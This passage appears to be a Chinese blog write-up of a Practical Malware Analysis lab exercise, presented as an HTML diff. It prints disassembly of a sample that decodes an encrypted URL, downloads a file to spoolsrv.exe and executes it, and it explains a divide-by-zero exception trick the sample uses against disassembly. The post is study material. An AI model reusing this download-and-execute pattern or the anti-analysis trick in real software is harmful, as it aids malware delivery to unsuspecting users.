inc     eax<br>.text:004014DA                 dec     eax<br>.text:004014DB                 call    $+5<br>.text:004014E0                 push    ebp<br>.text:004014E1                 mov     ebp, esp<br>.text:004014E3                 push    ebx<br>.text:004014E4                 push    esi<br>.text:004014E5                 push    edi<br>.text:004014E6                 push    offset unk_403010<br>.text:004014EB                 call    sub_401534<br>.text:004014F0                 add     esp, 4<br>.text:004014F3                 push    offset unk_403040<br>.text:004014F8                 call    sub_401534<br>.text:004014FD                 add     esp, 4<br>.text:00401500                 push    0<br>.text:00401502                 push    0<br>.text:00401504                 push    offset unk_403040<br>.text:00401509                 push    offset unk_403010<br>.text:0040150E                 push    0<br>.text:00401510                 call    URLDownloadToFileA<br>.text:00401515                 jz      short loc_40151A<br>.text:00401517                 jnz     short loc_40151A<br>.text:00401517 ; ---------------------------------------------------------------------------<br>.text:00401519                 db 0E8h<br>.text:0040151A ; ---------------------------------------------------------------------------<br>.text:0040151A<br>.text:0040151A loc_40151A:                             ; CODE XREF: .text:00401515↑j<br>.text:0040151A                                         ; .text:00401517↑j<br>.text:0040151A                 push    0<br>.text:0040151C                 push    offset unk_403040<br>.text:00401521                 call    ds:WinExec<br>.text:00401527                 push    0<br>.text:00401529                 call    ds:ExitProcess<br>.text:0040152F ; ---------------------------------------------------------------------------<br>.text:0040152F                 pop     edi<br>.text:00401530                 pop     esi<br>.text:00401531                 pop     ebx<br>.text:00401532                 pop     ebp<br></code></pre></td></tr></table></figure>
+
+<p>两段偏移分别如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:00403010 unk_403010      db  97h                 ; DATA XREF: .text:004014E6↑o<br>.data:00403010                                         ; .text:00401509↑o<br>.data:00403011                 db  8Bh<br>.data:00403012                 db  8Bh<br>.data:00403013                 db  8Fh<br>.data:00403014                 db 0C5h<br>.data:00403015                 db 0D0h<br>.data:00403016                 db 0D0h<br>.data:00403017                 db  88h<br>.data:00403018                 db  88h<br>.data:00403019                 db  88h<br>.data:0040301A                 db 0D1h<br>.data:0040301B                 db  8Fh<br>.data:0040301C                 db  8Dh<br>.data:0040301D                 db  9Eh<br>.data:0040301E                 db  9Ch<br>.data:0040301F                 db  8Bh<br>.data:00403020                 db  96h<br>.data:00403021                 db  9Ch<br>.data:00403022                 db  9Eh<br>.data:00403023                 db  93h<br>.data:00403024                 db  92h<br>.data:00403025                 db  9Eh<br>.data:00403026                 db  93h<br>.data:00403027                 db  88h<br>.data:00403028                 db  9Eh<br>.data:00403029                 db  8Dh<br>.data:0040302A                 db  9Ah<br>.data:0040302B                 db  9Eh<br>.data:0040302C                 db  91h<br>.data:0040302D                 db  9Eh<br>.data:0040302E                 db  93h<br>.data:0040302F                 db  86h<br>.data:00403030                 db  8Ch<br>.data:00403031                 db  96h<br>.data:00403032                 db  8Ch<br>.data:00403033                 db 0D1h<br>.data:00403034                 db  9Ch<br>.data:00403035                 db  90h<br>.data:00403036                 db  92h<br>.data:00403037                 db 0D0h<br>.data:00403038                 db  8Bh<br>.data:00403039                 db  8Bh<br>.data:0040303A                 db 0D1h<br>.data:0040303B                 db  97h<br>.data:0040303C                 db  8Bh<br>.data:0040303D                 db  92h<br>.data:0040303E                 db  93h<br>.data:0040303F                 db 0FFh<br>.data:00403040 unk_403040      db    0                 ; DATA XREF: .text:004014F3↑o<br>.data:00403040                                         ; .text:00401504↑o ...<br>.data:00403041                 db  8Ch<br>.data:00403042                 db  8Fh<br>.data:00403043                 db  90h<br>.data:00403044                 db  90h<br>.data:00403045                 db  93h<br>.data:00403046                 db  8Ch<br>.data:00403047                 db  8Dh<br>.data:00403048                 db  89h<br>.data:00403049                 db 0D1h<br>.data:0040304A                 db  9Ah<br>.data:0040304B                 db  87h<br>.data:0040304C                 db  9Ah<br>.data:0040304D                 db 0FFh<br>.data:0040304E                 db    0<br></code></pre></td></tr></table></figure>
+
+<p>猜测使对这两段数据进行了解密，于是放到x32dbg中下断看一下：</p>
+<p>触发条件是除零异常，可见代码实现了自己的异常处理函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0040149C                 push    large dword ptr fs:0<br>.text:004014A3                 mov     large fs:0, esp<br>.text:004014AA                 xor     ecx, ecx<br>.text:004014AC                 div     ecx<br></code></pre></td></tr></table></figure>
+
+<p><strong>2.恶意代码都做了什么？</strong></p>
+<p>下载了一个文件并启动它。</p>
+<p><strong>3.恶意代码使用了什么URL？</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">004014E6</span> | <span class="hljs-number">68</span> <span class="hljs-number">10304000</span>              | push lab15-<span class="hljs-number">03</span>.<span class="hljs-number">403010</span>                    | <span class="hljs-number">403010</span>:<span class="hljs-string">&quot;http://www.practicalmalwareanalysis.com/tt.html&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><code>http://www.practicalmalwareanalysis.com/tt.html</code></p>
+<p><strong>4.恶意代码使用了什么文件名？</strong></p>
+<p>由于网页已经不可访问，所以调试的时候应该修改一下代码，最后得出的文件名如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00403040</span>  FF <span class="hljs-number">73</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>F <span class="hljs-number">6</span>F <span class="hljs-number">6</span>C <span class="hljs-number">73</span> <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">2</span>E <span class="hljs-number">65</span> <span class="hljs-number">78</span> <span class="hljs-number">65</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ÿspoolsrv.exe...  <br></code></pre></td></tr></table></figure>
+
+<p><code>spoolsrv.exe</code></p>
+<hr>
+<h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/">恶意代码分析</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/">反汇编</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E9%98%B2%E5%8F%8D%E6%B1%87%E7%BC%96%E6%8A%80%E6%9C%AF/">防反汇编技术</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/03/%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">反调试技术</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/03/%E9%9A%90%E8%94%BD%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%90%AF%E5%8A%A8/">
+                        <span class="hidden-mobile">隐蔽的恶意代码启动</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
